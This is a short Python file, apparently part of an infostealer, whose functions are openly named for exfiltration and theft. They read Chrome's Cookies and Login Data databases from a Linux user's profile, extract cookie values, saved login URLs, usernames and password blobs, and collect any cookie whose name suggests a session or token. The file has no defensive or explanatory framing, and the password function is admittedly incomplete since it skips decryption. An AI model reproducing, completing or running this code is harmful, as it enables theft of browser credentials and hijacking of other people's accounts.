import os
import sqlite3
import base64

def exfil_chrome_cookies():
    cookie_path = os.path.expanduser('~/.config/google-chrome/Default/Cookies')
    if os.path.exists(cookie_path):
        conn = sqlite3.connect(cookie_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value FROM cookies")
        cookies = cursor.fetchall()
        conn.close()
        return cookies
    return []

def exfil_chrome_passwords():
    # Requires decryption, simplified
    login_path = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
    if os.path.exists(login_path):
        conn = sqlite3.connect(login_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        logins = cursor.fetchall()
        conn.close()
        return logins
    return []

def steal_session_tokens():
    # Steal tokens from Chrome local storage or cookies
    tokens = {}
    # From cookies
    cookies = exfil_chrome_cookies()
    for host, name, value in cookies:
        if 'session' in name.lower() or 'token' in name.lower():
            tokens[f"{host}_{name}"] = value
    # Add from local storage if possible
    return tokens